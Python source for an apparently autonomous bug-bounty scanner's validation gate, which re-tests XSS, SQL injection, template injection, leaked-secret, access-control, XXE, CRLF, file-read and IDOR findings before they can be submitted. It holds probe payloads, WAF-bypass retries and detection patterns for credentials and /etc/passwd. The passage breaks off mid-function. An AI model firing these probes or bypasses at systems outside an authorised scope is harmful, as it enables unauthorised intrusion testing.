"""Independent validation gate for swarm findings — the autonomy lever.

A worker that FINDS a vulnerability must not be the only thing that CONFIRMS it.
This gate re-tests every finding through a DIFFERENT code path
(core.finding_validator.FindingValidator, which issues its own requests via the
hunt's scope/proxy/auth context) and sets a hard ``validated`` flag plus a
calibrated confidence. Only findings that pass become ``submittable``; everything
else is a ``lead`` for manual review.

It is FAIL-CLOSED: a finding that cannot be independently re-confirmed (network
error, no matching validator, low confidence) is NOT submittable. That is the
difference between an autonomous agent that earns and one that gets banned for
false-positive spam — VIPER never auto-submits anything an independent check
didn't reproduce.
"""

from __future__ import annotations

import asyncio
import logging
import re
from typing import Awaitable, Callable, List, Optional, Tuple

logger = logging.getLogger("viper.swarm_validation")

# A fresh marker the original worker did NOT use, so re-confirmation is an
# independent probe (an arbitrary attacker origin/host the server must reflect).
_PROBE_ORIGIN = "https://viper-revalidate.example"
_PROBE_HOST = "viper-revalidate.example"

_ENV_LINE = re.compile(r"(?m)^[A-Z][A-Z0-9_]{2,}=\S")
_DIRLIST = ("index of /", "parent directory", "directory listing for")

# Tight DB-error signatures (a corpus search quoting "SQL syntax" won't reproduce
# the SAME one under two different quote chars; a broken query does).
# DB-SPECIFIC error signatures only. Deliberately EXCLUDES generic grammar-parser
# phrasing like `near "...": syntax error` and `Warning: ...sql`, which ordinary
# query-DSL parsers (Lucene/CEL/homegrown) reuse — they tripped a gate FP.
_SQL_ERR = re.compile(
    r"You have an error in your SQL syntax|SQLSTATE\[|ORA-\d{5}|"
    r"unclosed quotation mark|quoted string not properly terminated|"
    r"PG::\w*Error|psqlException|MySqlException|valid MySQL result|"
    r"sqlite3?\.(Operational|Programming)Error|SQLITE_ERROR|"
    r"Microsoft OLE DB|Incorrect syntax near|PostgreSQL.{0,20}ERROR|"
    r"ODBC SQL Server", re.I)
_PASSWD = re.compile(r"root:.*?:0:0:")

# Unambiguous credential SHAPES — a benign page never carries these verbatim.
_SECRET_SHAPE = re.compile(
    r"AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|"
    r"sk_live_[0-9A-Za-z]{20,}|AIza[0-9A-Za-z_\-]{35}|"
    r"xox[baprs]-[0-9A-Za-z\-]{10,}|"
    r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |)PRIVATE KEY-----")
# STRONGLY-private content that a public endpoint never returns. Deliberately
# EXCLUDES "email"/"name" — public profiles carry those, so they are not proof of
# broken access control.
_SENSITIVE = re.compile(
    r'"(password|passwordHash|password_hash|ssn|social_security|creditCard|'
    r'card_number|cardNum|cvv|sessionToken|session_token|access_token|'
    r'api_?key|private_?key|secret)"\s*:\s*"[^"]'
    r"|AKIA[0-9A-Z]{16}|-----BEGIN .*PRIVATE KEY", re.I)

# WAF / edge-block signatures — a quote that returns one of these was BLOCKED, not
# executed by a database (defeats the SQLi-on-a-WAF gate false positive).
_WAF_STATUSES = frozenset({403, 406, 429, 501})
_WAF_MARKERS = re.compile(
    r"blocked by|request blocked|web application firewall|security policy|"
    r"forbidden by|access denied|incapsula|cloudflare|akamai|mod_security|"
    r"reference\s*id|cf-ray|attention required|request was flagged", re.I)
# Non-executing HTML regions: a reflection that only survives inside one of these
# is inert (RCDATA/RAWTEXT/comment) — not exploitable XSS.
_INERT_REGION = re.compile(
    r"<textarea\b[^>]*>.*?</textarea>|<title\b[^>]*>.*?</title>|"
    r"<script\b[^>]*>.*?</script>|<style\b[^>]*>.*?</style>|"
    r"<xmp\b[^>]*>.*?</xmp>|<noscript\b[^>]*>.*?</noscript>|<!--.*?-->",
    re.I | re.S)
# A passwd-format account line (name:x:uid:gid:...). A real /etc/passwd has many;
# a doc that merely quotes the canonical root line has one.
_PASSWD_LINE = re.compile(r"(?m)^[a-z_][a-z0-9_-]*:[^:]*:\d+:\d+:")
# Real directory-listing autoindex markers (Apache / nginx / IIS).
_AUTOINDEX = re.compile(r"(?:<title>|<h1>)\s*index of\s+/|\[to parent directory\]|"
                        r'<a href="\.\./"', re.I)
# Obvious credential PLACEHOLDERS that are not live secrets.
_SECRET_PLACEHOLDER = re.compile(r"EXAMPLE|XXXX|PLACEHOLDER|YOUR_|<.*>|0{8,}", re.I)
# PUBLISHABLE / client-side keys that are intended to be public (not a leak).
_PUBLISHABLE = re.compile(
    r"pk_(live|test)_|publishable|ingest\.sentry\.io|sentry[_-]?dsn|"
    r"search[_-]?only|sandbox|demo[-_]?token|client_id", re.I)
# Doc/changelog URLs where a credential-shaped string is usually rotated/sample.
_DOC_URL = re.compile(r"(changelog|readme|history|release[-_]?notes)|\.(txt|md|rst)(\?|$)", re.I)
# Sensitive FIELD:VALUE pairs (captures the value so a placeholder can be told from real
# data — a public API-doc/demo body serves "password":"changeme"; a real leak serves a
# bcrypt hash / token). Field-name list mirrors _SENSITIVE.
_SENSITIVE_KV = re.compile(
    r'"(password|passwordHash|password_hash|ssn|social_security|creditCard|card_number|'
    r'cardNum|cvv|sessionToken|session_token|access_token|api_?key|private_?key|secret)"'
    r'\s*:\s*"([^"]{1,200})"', re.I)
# Placeholder/demo VALUES (a field carrying one of these is example data, not a live leak).
_PLACEHOLDER_VALUE = re.compile(
    r"change_?me|^password$|^passw0rd|^123456|^secret$|^test$|^example|^string$|^null$|"
    r"^none$|^your_|^<|\*{3,}|^admin$|^user$|^pass$|^foo$|^bar$|placeholder|redacted|"
    r"dummy|^sample|xxxx|^s3cr3t", re.I)
# A credential-strength VALUE: bcrypt/argon/crypt hash, JWT, AKIA, PEM, long hex/base64.
_CRED_VALUE = re.compile(
    r"\$2[aby]\$|\$argon2|^\$[1256]\$|eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.|"
    r"AKIA[0-9A-Z]{16}|-----BEGIN|[0-9a-f]{32,}|[A-Za-z0-9+/]{24,}={0,2}\Z", re.I)
# API-documentation / schema surfaces (an anonymously-served example body is docs, not BAC).
_DOC_SURFACE_URL = re.compile(
    r"swagger|openapi|api[-_]?docs?|redoc|/schema\b|graphiql|/docs?(/|\?|$)", re.I)
# Static-asset content types where a CORS reflection exposes nothing sensitive.
_STATIC_CT = ("text/css", "javascript", "font", "image/", "woff", "octet-stream")


def _waf_block(resp) -> bool:
    return (getattr(resp, "status", 0) in _WAF_STATUSES
            or bool(_WAF_MARKERS.search(_body(resp))))


def _ctype(resp) -> str:
    return ((getattr(resp, "headers", {}) or {}).get("content-type", "") or "").lower()


def _body(resp) -> str:
    return getattr(resp, "body", "") or ""


def _ok2xx(resp) -> bool:
    return resp is not None and 200 <= getattr(resp, "status", 0) < 300


async def _recheck_xss(finding, fetch, timeout):
    """Confirm XSS. When a headless browser (Playwright) is available, the definitive
    oracle runs FIRST: if the payload's JS actually EXECUTES in the page origin (reflected,
    JS-context, or a DOM-sourced location.hash sink) it is confirmed — this catches
    DOM-XSS and filtered-but-bypassed reflections the read-only differential misses.
    With no browser it falls back to the read-only reflection differential below (a
    reflection that lands as LIVE, unencoded markup in an HTML context), so precision
    NEVER depends on a browser being installed."""
    import secrets
    from core.swarm_workers.vuln._http import add_query
    param = finding.get("parameter")
    url = finding.get("url") or ""
    if not url:
        return False, 0.0, "no url to re-test"

    # Browser execution oracle (superset confirmation; unforgeable via a random marker).
    try:
        from core.browser import viper_browser
        if viper_browser.available():
            from core.swarm_workers.vuln._http import is_in_scope
            _m = "vx" + secrets.token_hex(6)
            _res = await viper_browser.probe_dom_xss(
                url, param, marker=_m, scope_guard=is_in_scope)
            if _res is True:
                return True, 0.9, ("payload EXECUTED in a headless browser (window marker "
                                   "set) — XSS confirmed (reflected or DOM-sourced)")
            # False/None -> fall through to the read-only reflection differential.
    except Exception:  # noqa: BLE001 — the oracle must never break the gate
        pass

    if not param:
        return False, 0.0, "no parameter to re-test"
    tag = "vgx" + secrets.token_hex(3)
    r = await fetch("GET", add_query(url, param, f"<{tag}>x</{tag}>"), timeout=timeout)
    if r is None:
        return False, 0.0, "re-fetch failed"
    ct = _ctype(r)
    body = _body(r)
    if body.lstrip()[:1] in ("{", "["):
        return False, 0.2, "JSON body — browsers treat it as data, not markup"
    if not ("html" in ct or "xhtml" in ct or "svg" in ct):
        return False, 0.2, "not an HTML/SVG content type — reflection is inert"
    # Remove non-executing regions (textarea/title/script/style/comment); a tag
    # that only survives inside one of those is inert RCDATA/RAWTEXT, not XSS.
    live = _INERT_REGION.sub("", body)
    idx = live.find(f"<{tag}>")
    if idx != -1 and f"&lt;{tag}&gt;" not in body:
        # It is a LIVE element only if it lands in element CONTENT, not inside an
        # open tag's attribute value (value="<tag>" — the < is inert text there).
        before = live[:idx]
        if before.rfind("<") <= before.rfind(">"):
            return True, 0.8, "injected tag reflected as a LIVE element (element content, not an attribute)"
        return False, 0.2, "reflection lands inside an HTML attribute value — inert, not exploitable"
    return False, 0.2, "reflection encoded or only inside a non-executing context — not exploitable"


async def _recheck_sqli(finding, fetch, timeout):
    """Confirm a DB error appears under BOTH a single- and double-quote breaker but
    not a benign value — a corpus search echoing 'SQL syntax' fails this (it returns
    different content for ' vs ")."""
    from core.swarm_workers.vuln._http import add_query
    param = finding.get("parameter")
    url = finding.get("url") or ""
    if not param or not url:
        return False, 0.0, "no parameter to re-test"

    def dberr(r):  # a genuine DB error: an error signature AND a 5xx (query broke)
        return bool(_SQL_ERR.search(_body(r))) and getattr(r, "status", 0) >= 500

    benign = await fetch("GET", add_query(url, param, "1"), timeout=timeout)
    q1 = await fetch("GET", add_query(url, param, "1'"), timeout=timeout)
    bal = await fetch("GET", add_query(url, param, "1''"), timeout=timeout)
    if None in (benign, q1, bal):
        return False, 0.0, "re-fetch failed"
    if _waf_block(q1):
        # The raw quote was WAF-blocked. Before failing closed, give the candidate
        # a FAIR re-test through the WAF: retry encoding mutations and apply the
        # SAME strong DB-error differential to whatever gets through. No relaxation
        # — a bypass that doesn't reproduce a clean 5xx differential is still a lead.
        from core.swarm_workers.vuln._bypass import adaptive_fetch

        def _b(v):
            return add_query(url, param, v)
        bq1 = (await adaptive_fetch("GET", _b, "1'", timeout=timeout)).response
        bbal = (await adaptive_fetch("GET", _b, "1''", timeout=timeout)).response
        if bq1 is None or _waf_block(bq1):
            return False, 0.1, ("quote blocked by a WAF/edge and no encoding bypass "
                                "got through")
        if not _SQL_ERR.search(_body(benign)) and dberr(bq1) and not dberr(bbal):
            return True, 0.8, ("WAF blocked the raw quote; an encoding bypass reached "
                               "the database and the unbalanced-quote DB-error "
                               "differential held — genuine SQL injection")
        return False, 0.2, ("quote WAF-blocked; a bypass reached the app but produced "
                            "no clean DB-error differential")
    # Real injection: the UNBALANCED quote breaks the query (DB error + 5xx) while
    # the benign value and a BALANCED '' do not. Rejects: a 200 page merely echoing
    # "SQL syntax" (corpus search — no 5xx); a WAF block (handled above); an app
    # that 500s on every quote including '' (balanced test).
    if not _SQL_ERR.search(_body(benign)) and dberr(q1) and not dberr(bal):
        return True, 0.8, ("unbalanced quote caused a DB error (5xx); a balanced '' "
                           "and the benign value did not — genuine SQL injection")
    return False, 0.2, "no clean DB-error differential (reflected text / quote filter / WAF)"


async def _recheck_ssti(finding, fetch, timeout):
    """Confirm a FRESH arithmetic expression (operands the worker never used) is
    EVALUATED — product present, literal consumed, absent in a control."""
    from core.swarm_workers.vuln._http import add_query
    param = finding.get("parameter")
    url = finding.get("url") or ""
    if not param or not url:
        return False, 0.0, "no parameter to re-test"
    confirmed = 0
    for expr, prod in (("8*8", "64"), ("11*11", "121")):
        live = await fetch("GET", add_query(url, param, "${" + expr + "}"), timeout=timeout)
        ctrl = await fetch("GET", add_query(url, param, "${" + expr.replace("*", "x") + "}"),
                           timeout=timeout)
        bare = await fetch("GET", add_query(url, param, expr), timeout=timeout)  # no ${}
        if live is None or ctrl is None or bare is None:
            return False, 0.0, "re-fetch failed"
        lb, cb, bb = _body(live), _body(ctrl), _body(bare)
        # Template engine: ${8*8} -> 64 (consumed), control has no 64, AND the BARE
        # `8*8` is NOT evaluated. A plain calculator computes 8*8 with or without
        # the ${} delimiters, so it fails the bare test.
        if prod in lb and prod not in cb and expr not in lb and prod not in bb:
            confirmed += 1
    if confirmed < 2:
        return False, 0.2, "fresh operands not template-evaluated (or a plain math evaluator)"
    # A delimiter-gated CALCULATOR (a "formula field") also passes the numeric
    # test. Require a STRING operation only a real template engine evaluates.
    for tmpl in ('${"VIP"+"ER"}', '{{"VIP"~"ER"}}', '${"VIP".concat("ER")}'):
        rs = await fetch("GET", add_query(url, param, tmpl), timeout=timeout)
        if rs is not None and "VIPER" in _body(rs) and tmpl not in _body(rs):
            return True, 0.8, ("arithmetic AND string concatenation evaluated "
                               "(consumed) — a template engine, not a calculator")
    return False, 0.3, ("arithmetic evaluated but string ops did not — a "
                        "delimiter-gated calculator, not a template engine (lead)")


async def _recheck_secrets(finding, fetch, timeout):
    """Confirm a SHAPE-SPECIFIC credential (AKIA…, ghp_…, sk_live_…, PEM key) is
    reproduced in the response — a benign page never carries these verbatim. A
    generic/entropy-only match stays a lead (manual review)."""
    url = finding.get("url") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    r = await fetch("GET", url, timeout=timeout)
    if not _ok2xx(r):
        return False, 0.1, "url no longer serves 2xx"
    # A credential-shaped string in a changelog/readme/doc is usually rotated or a
    # sample — not a live leak. Leave it for human review.
    if _DOC_URL.search(url):
        return False, 0.3, "credential-shaped string in a doc/changelog — likely rotated/sample (lead)"
    body = _body(r)
    for mm in _SECRET_SHAPE.finditer(body):
        tok = mm.group(0)
        ctx = body[max(0, mm.start() - 12):mm.end() + 12]
        # Skip obvious placeholders/examples (AKIA…EXAMPLE, YOUR_KEY, <token>, 0000…).
        if _SECRET_PLACEHOLDER.search(tok) or _SECRET_PLACEHOLDER.search(ctx):
            continue
        # PUBLIC-BY-DESIGN shape: a Google `AIza…` key is routinely a browser/Firebase
        # API key that is MEANT to be served publicly (Maps/Firebase config, JSON or JS) —
        # its mere presence is NOT proof of a leaked server credential. The gate must not
        # auto-confirm it (that was a precision-1.00 false positive). Only NEVER-public
        # shapes (AKIA/ghp_/gho_/sk_live_/xox*/PEM) confirm; AIza stays a lead.
        if tok.startswith("AIza"):
            continue
        return True, 0.75, f"live-looking credential reproduced ({tok[:4]}…)"
    return False, 0.2, ("only placeholder / public-by-design (e.g. Google browser key) / "
                        "example credentials (or none) — manual review (lead)")


async def _recheck_access_control(finding, fetch, timeout):
    """Confirm a protected endpoint returns sensitive data to an ANONYMOUS request
    (no session). Read-only: a 401/403 (or no sensitive content) means access
    control works and the finding stays a lead."""
    url = finding.get("url") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    # use_session_auth=False -> send NO session, even if a hunt installed one.
    r = await fetch("GET", url, timeout=timeout, use_session_auth=False)
    if not _ok2xx(r):
        return False, 0.2, "not accessible anonymously (access control works)"
    body = _body(r)
    # Publishable/client-side keys (Stripe pk_live, Algolia search key, Sentry DSN,
    # demo tokens) are intended to be served anonymously — not broken access control.
    if _PUBLISHABLE.search(body):
        return False, 0.3, "anonymous data is a PUBLISHABLE/client-side key (intended public) — lead"
    # API docs / schema specs / GraphiQL serve EXAMPLE bodies (a "password":"changeme"
    # field, a spec with a `passwordHash` property) anonymously — that is documentation,
    # not broken access control. (Precision fix: this was a false positive.)
    ct = (r.headers.get("content-type", "") if getattr(r, "headers", None) else "").lower()
    is_doc = (_DOC_SURFACE_URL.search(url) or "schema+json" in ct
              or re.search(r'"(swagger|openapi)"\s*:', body[:2000]))
    if is_doc:
        return False, 0.3, ("anonymous body is API-doc/schema/example content, not a live "
                            "leak — manual review (lead)")
    # A credential VALUE served anonymously (AKIA…/PEM, not a public AIza) is decisive.
    ms = _SECRET_SHAPE.search(body)
    if ms and not ms.group(0).startswith("AIza"):
        ctx = body[max(0, ms.start() - 12):ms.end() + 12]
        if not _SECRET_PLACEHOLDER.search(ctx):
            return True, 0.8, "protected endpoint returns a live credential VALUE anonymously (2xx)"
    # Sensitive FIELDS: confirm only when a field carries a REAL credential-strength value
    # (a bcrypt/argon hash, a JWT, ...) or when >=2 DISTINCT sensitive fields appear
    # together (a single placeholder-valued field is likely a demo/schema example -> lead).
    pairs = _SENSITIVE_KV.findall(body)
    real = [(f, v) for f, v in pairs if not _PLACEHOLDER_VALUE.search(v.strip())]
    distinct = {f.lower() for f, _ in real}
    strong = any(_CRED_VALUE.search(v.strip()) for _, v in real)
    if strong or len(distinct) >= 2:
        return True, 0.7, ("protected endpoint returns real private data ANONYMOUSLY "
                           f"({sorted(distinct)[:4]})")
    if pairs:
        return False, 0.3, ("anonymous body has only placeholder-valued / single sensitive "
                            "field(s) — likely a demo/schema example (lead)")
    return False, 0.2, "anonymous access returns no strongly-private content"


async def _recheck_proto_pollution(finding, fetch, timeout):
    """Confirm client-side prototype pollution with a real headless-browser DOM oracle.

    When Playwright is available, navigate the candidate URL with a ``__proto__`` payload
    carrying a unique marker and read it back off ``Object.prototype`` — an UNFORGEABLE
    observation (a random marker is undefined on a normal page), so a confirmation is never
    a false positive. Without a browser it returns a LEAD, so the class stays manual-review
    exactly as before and gate precision never depends on a browser being installed.
    Read-only navigation, in-scope only."""
    url = finding.get("url") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    try:
        from core.browser import viper_browser
    except Exception:   # noqa: BLE001
        viper_browser = None
    if viper_browser is None or not viper_browser.available():
        return False, 0.3, ("client-side prototype-pollution gadget — confirming needs a "
                            "browser/DOM oracle (Playwright not installed); verify manually "
                            "(lead)")
    import secrets as _secrets
    from core.swarm_workers.vuln._http import is_in_scope
    marker = "vp" + _secrets.token_hex(6)
    try:
        result = await viper_browser.probe_proto_pollution(
            url, marker, scope_guard=is_in_scope,
            timeout_ms=int((timeout or 15) * 1000))
    except Exception:   # noqa: BLE001 — the oracle must never raise into the gate
        result = None
    if result is True:
        return True, 0.9, ("client-side prototype pollution CONFIRMED — a __proto__ payload "
                           "in the URL polluted Object.prototype in a real headless browser "
                           "(the injected marker was observed on the global prototype) "
                           "(CWE-1321)")
    if result is False:
        return False, 0.3, ("prototype-pollution gadget present, but the DOM oracle did not "
                            "observe global pollution via the URL on this page — manual "
                            "review (lead)")
    return False, 0.3, "DOM oracle unavailable/errored — manual review (lead)"


async def _recheck_clickjacking(finding, fetch, timeout):
    """Re-fetch and confirm the page is genuinely framable: an HTML 2xx with NO
    X-Frame-Options and NO CSP frame-ancestors. A static asset, a non-HTML body,
    or either anti-framing control present means it is not a clickjacking target."""
    url = finding.get("url") or finding.get("target") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    r = await fetch("GET", url, timeout=timeout)
    if not _ok2xx(r):
        return False, 0.2, "not a 2xx page (no framing surface)"
    h = r.headers or {}
    if "html" not in (h.get("content-type", "")).lower():
        return False, 0.2, "not an HTML page (no clickjacking surface)"
    if (h.get("x-frame-options", "") or "").strip():
        return False, 0.2, "X-Frame-Options present — not framable"
    if "frame-ancestors" in (h.get("content-security-policy", "")).lower():
        return False, 0.2, "CSP frame-ancestors present — not framable"
    return True, 0.6, ("HTML page served with no X-Frame-Options and no CSP "
                       "frame-ancestors — framable (clickjacking)")


async def _recheck_xxe(finding, fetch, timeout):
    """Independently re-run the in-band XXE probe. A reproduced local-file read
    (/etc/passwd content) is strong confirmation; a reproduced external-entity
    parser error is medium. (Blind XXE is confirmed earlier via the OOB token.)"""
    url = finding.get("url") or finding.get("target") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    from core.swarm_workers.vuln.xxe import run as _xxe_run

    class _A:
        target = url
        timeout_s = timeout
        payload = {}
    try:
        res = await _xxe_run(_A())
    except Exception:
        res = []
    if any("file_read" in (f.get("vuln_type") or "") for f in res):
        return True, 0.9, "XXE local-file read reproduced (/etc/passwd content returned)"
    if any("entity_processing" in (f.get("vuln_type") or "") for f in res):
        return True, 0.6, ("XXE external-entity processing reproduced (parser error) "
                           "— blind exfiltration would need OAST")
    return False, 0.3, "XXE not reproduced on re-test (lead)"


async def _recheck_crlf(finding, fetch, timeout):
    """Independently re-run the CRLF probe (fresh random token). It confirms only
    when an attacker-controlled header carrying THAT token appears in the response
    — header injection, not mere reflection. Reproduction = confirmation."""
    url = finding.get("url") or finding.get("target") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    from core.swarm_workers.vuln.crlf import run as _crlf_run

    class _A:
        target = url
        timeout_s = timeout
        payload = {"parameter": finding.get("parameter")}
    try:
        res = await _crlf_run(_A())
    except Exception:
        res = []
    if res:
        return True, 0.85, ("fresh CRLF re-injection emitted an attacker-controlled "
                            "response header carrying our unique token (header injection)")
    return False, 0.3, "CRLF injection not reproduced on re-test (lead)"


async def _recheck_cloud_exposure(finding, fetch, timeout):
    """Independently re-fetch and re-confirm the cloud-bucket exposure signal
    (a provider listing root + a real object entry, or a NoSuchBucket takeover)."""
    url = finding.get("url") or finding.get("target") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    from core.swarm_workers.vuln.cloud_exposure import classify
    r = await fetch("GET", url, timeout=timeout)
    hit = classify(r)
    if hit:
        return True, 0.85, f"cloud storage exposure reproduced ({hit[0]})"
    return False, 0.2, "cloud-bucket exposure not reproduced on re-test (lead)"


async def _recheck_subdomain_takeover(finding, fetch, timeout):
    """Independently re-fetch and re-confirm the service's unclaimed-resource
    fingerprint. These strings only appear on a de-provisioned third-party
    resource, so a fresh match is strong confirmation of a claimable subdomain."""
    url = finding.get("url") or finding.get("target") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    from urllib.parse import urlsplit as _urlsplit2
    from core.swarm_workers.vuln.subdomain_takeover import (
        cname_matches_service, match_fingerprint)
    r = await fetch("GET", url, timeout=timeout)
    if not r or not (r.body or ""):
        return False, 0.0, "re-fetch failed"
    if getattr(r, "status", 0) < 400:
        return False, 0.2, ("service-error fingerprint on a 2xx page (content / parked "
                            "domain, not an unclaimed resource) — lead")
    service = match_fingerprint(r.body)
    if service:
        host = _urlsplit2(url).hostname or ""
        if cname_matches_service(host, service):
            return True, 0.9, (f"unclaimed {service} fingerprint + dangling CNAME to "
                               f"{service} — subdomain takeover confirmed")
        return True, 0.85, (f"unclaimed {service} resource fingerprint reproduced "
                            "— dangling DNS record, subdomain takeover")
    return False, 0.2, "takeover fingerprint not present on re-test (lead)"


async def _recheck_host_header(finding, fetch, timeout):
    """Independently re-test host-header injection with a FRESH marker host.

    A spoofed header reflected into the Location redirect (or an absolute URL in
    the body) — that a benign control request (real Host) does NOT contain — is
    the confirmation. A reflection of our path or nothing is a lead."""
    import re as _re
    import secrets as _secrets
    from urllib.parse import urlsplit as _urlsplit
    url = finding.get("url") or finding.get("target") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    header = finding.get("parameter") or "X-Forwarded-Host"
    marker = f"viperhhre{_secrets.token_hex(4)}.example.net"
    value = f"host={marker}" if header.lower() == "forwarded" else marker
    control = await fetch("GET", url, timeout=timeout, follow_redirects=False,
                          use_session_auth=False)
    probe = await fetch("GET", url, headers={header: value}, timeout=timeout,
                        follow_redirects=False, use_session_auth=False)
    if probe is None:
        return False, 0.0, "re-fetch failed"

    def _rhost(loc):
        loc = (loc or "").strip()
        if loc.startswith("//"):
            return loc[2:].split("/")[0].split("?")[0].split("#")[0].lower()
        if "://" in loc:
            return _urlsplit(loc).netloc.lower()
        return ""
    ploc = (probe.headers or {}).get("location", "")
    cloc = (control.headers or {}).get("location", "") if control else ""
    cbody = (control.body or "") if control else ""
    # marker must be the redirect TARGET HOST, not merely present in the Location.
    if _rhost(ploc) == marker and _rhost(cloc) != marker:
        return True, 0.8, (f"spoofed {header} set as the Location redirect target host "
                           "(cache poisoning / open redirect / reset-link poisoning)")
    rx = _re.compile(r"//" + _re.escape(marker) + r"(?=[/:?#\"'\s]|$)", _re.I)
    if rx.search(probe.body or "") and not rx.search(cbody):
        return True, 0.6, (f"spoofed {header} reflected as an absolute-URL host in the "
                           "response body")
    return False, 0.3, "spoofed host not reflected on re-test (lead)"


async def _recheck_cmdi(finding, fetch, timeout):
    """Re-run the hardened command-injection time-test from a fresh context. Its
    paired-control median scaling already rejects load/latency noise; a SECOND
    independent run that still fires confirms the delay is reproducible (a
    transient load spike — the cmdi failure mode — won't repeat)."""
    url = finding.get("url") or finding.get("target") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    try:
        import core.swarm_workers  # noqa: F401  (registers workers)
        from core.swarm_engine import SwarmAgent
        from core.swarm_workers import get_worker_runner
        run = get_worker_runner("vuln", "command_injection")
        if run is None:
            return False, 0.0, "cmdi worker unavailable"
        ag = SwarmAgent(agent_id="gate", objective="revalidate", target=url,
                        technique="command_injection", payload={},
                        timeout_s=min(timeout if timeout else 12.0, 12.0))
        fs = await run(ag)
    except Exception as e:  # noqa: BLE001
        return False, 0.0, f"cmdi re-run error: {e}"
    # Only a REFLECTION-confirmed re-fire (executed command output echoed back,
    # severity critical) is trustworthy. A timing-only re-fire is NOT orthogonal
    # (it re-runs the same time heuristic, which a tarpit/numeric-latency endpoint
    # also fools), so it stays a LEAD for human corroboration.
    fs = fs or []
    if any("cmdi" in str(f.get("vuln_type", "")) and str(f.get("severity")) == "critical"
           for f in fs):
        finding["retest_type"] = "reflection_confirmed"
        return True, 0.85, ("command injection reproduced with EXECUTED command output "
                            "(marker echoed) — not timing-only")
    if any("cmdi" in str(f.get("vuln_type", "")) for f in fs):
        finding["retest_type"] = "timing_only"
        return False, 0.3, ("only a timing-based signal reproduced (no executed output) "
                            "— a tarpit can fake this; manual corroboration needed (lead)")
    finding["retest_type"] = "not_reproduced"
    return False, 0.2, "not reproduced on re-run"


async def _recheck_lfi(finding, fetch, timeout):
    """Confirm an /etc/passwd signature under the traversal payload but NOT under a
    benign control (a doc-search echo leaks for both; a real read needs traversal)."""
    from core.swarm_workers.vuln._http import add_query
    param = finding.get("parameter")
    url = finding.get("url") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    inj = await fetch("GET", url, timeout=timeout)   # the finding url carries the traversal
    if inj is None:
        return False, 0.0, "re-fetch failed"
    # A real file read returns the RAW file; a docs/man-page search wraps the
    # quoted passwd in an HTML page.
    if "html" in _ctype(inj):
        return False, 0.2, "HTML response — a docs page quoting passwd, not a raw file read"
    # A real /etc/passwd has MANY account lines; a doc that merely quotes the
    # canonical root line (or a search echo) has one. Require >= 2 distinct accounts.
    accounts = set(_PASSWD_LINE.findall(_body(inj)))
    if len(accounts) < 2:
        return False, 0.2, ("fewer than 2 passwd-format account lines — a doc quoting "
                            "root:x:0:0, not a file read")
    if param:
        ctrl = await fetch("GET", add_query(url, param, "harmless-token-zzz9"), timeout=timeout)
        if ctrl is not None and len(set(_PASSWD_LINE.findall(_body(ctrl)))) >= 2:
            return False, 0.2, "benign control also returns passwd lines — corpus echo, not a file read"
    return True, 0.8, f"{len(accounts)} distinct /etc/passwd account lines under traversal, absent for a benign value"


async def _recheck_idor(finding, fetch, timeout, bola_config):
    """Single-session IDOR is only a CANDIDATE (two accounts are needed to prove a
    cross-user read). If the operator supplied two sessions (bola_config), escalate
    to the two-account BOLA test: replay the candidate object URL as identity B and
    confirm it leaks identity A's private marker. Otherwise it stays a lead."""
    url = finding.get("url") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    cfg = bola_config or {}
    if not (cfg.get("owner_headers") and cfg.get("attacker_headers")
            and cfg.get("owner_markers")):
        return False, 0.0, ("single-session IDOR candidate — supply two sessions "
                            "(--cookie/--cookie-b + --owner-marker) to auto-confirm")
    from core.specialist.bola_engine import Session, find_bola
    owner = Session(cfg.get("owner_name", "A"), cfg["owner_headers"], cfg["owner_markers"])
    attacker = Session(cfg.get("attacker_name", "B"), cfg["attacker_headers"],
                       cfg.get("attacker_markers", []))

    async def _f(method, u, *, headers=None, timeout=timeout):
        return await fetch(method, u, headers=headers, timeout=timeout,
                           use_session_auth=False)
    try:
        fs = await find_bola(owner, attacker, [url], fetch=_f, timeout=timeout,
                             unauth_control=cfg.get("unauth_control", True))
    except Exception as e:  # noqa: BLE001
        return False, 0.0, f"BOLA escalation error: {e}"
    if fs:
        return True, 0.9, ("escalated to two-account BOLA: identity B read identity "
                           "A's private object (CWE-639)")
    return False, 0.2, "two-account replay did not confirm cross-user access"


async def _recheck_graphql_authz(finding, fetch, timeout, bola_config):
    """GraphQL FIELD-LEVEL AUTHORIZATION bypass — BOLA/BFLA over a GraphQL query
    (OWASP API#1/#5). Opt-in and two-identity, mirroring the IDOR/BOLA discipline:

    given the operator's owner+attacker sessions (bola_config) and a READ-ONLY query that
    returns the OWNER's private data (``finding['graphql_query']``), it is a real bypass iff
    the owner's private marker appears in the owner's response AND the ATTACKER's response,
    but NOT in an ANONYMOUS control (if anon sees it too, the field is public data — not an
    authorization flaw). Read queries only: a mutation is refused outright (the gate never
    mutates target state). Without both sessions + a marker it stays a lead."""
    import json as _json
    url = finding.get("url") or ""
    query = (finding.get("graphql_query") or "").strip()
    if not url or not query:
        return False, 0.0, "graphql-authz candidate missing endpoint / query (lead)"
    # Never send a mutation/subscription — read-only gate.
    _lead = query.lower().lstrip().split("{", 1)[0].split("(", 1)[0]
    if "mutation" in _lead or "subscription" in _lead:
        return False, 0.0, "refusing to send a GraphQL mutation/subscription (read-only) (lead)"
    cfg = bola_config or {}
    owner_h, att_h = cfg.get("owner_headers"), cfg.get("attacker_headers")
    markers = [m for m in (cfg.get("owner_markers") or []) if m]
    if not (owner_h and att_h and markers):
        return False, 0.3, ("GraphQL field-authz candidate — supply two sessions "
                            "(owner + attacker) + --owner-marker to auto-confirm (lead)")
    body = _json.dumps({"query": query}).encode("utf-8")
    # A marker that is literally present in the QUERY we send would be echoed back in an
    # error message ("Not authorized to access <marker>") — that is a reflection of our own
    # input, not leaked data. Drop such markers so an authZ *error* body can't false-confirm.
    q_low = query.lower()
